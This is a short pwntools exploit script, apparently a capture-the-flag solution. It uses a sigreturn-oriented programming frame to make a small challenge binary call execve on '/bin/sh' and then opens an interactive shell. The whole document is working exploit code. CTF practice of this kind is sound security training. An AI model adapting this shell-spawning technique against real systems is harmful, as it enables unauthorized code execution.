from pwn import *

binary = './chall'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('microp.ctf.prgy.in', 1337, ssl=True)

# gdb.attach(r, '''
#     b *_start+108
#     c
# ''')

frame = SigreturnFrame()
frame.rax = 59          # execve syscall number
frame.rdi = 0x4020B0    # Pointer to "/bin/sh" string (_bss_start)
frame.rsi = 0           # NULL argv
frame.rdx = 0           # NULL envp
frame.rip = 0x401098    # syscall instruction

payload_stage1 = bytes(frame).ljust(0x1F3, b'\x00')

r.recvuntil(b"I'm small, aren't I? Nobody expects me to do anything...")
r.send(payload_stage1)

payload_stage2 = b"/bin/sh\x00".ljust(15, b'\x00')

r.recvuntil(b"I guess I'll just stay here, too small to matter. Figures.")
r.send(payload_stage2) # Write /bin/sh to _bss_start

r.interactive()
r.close()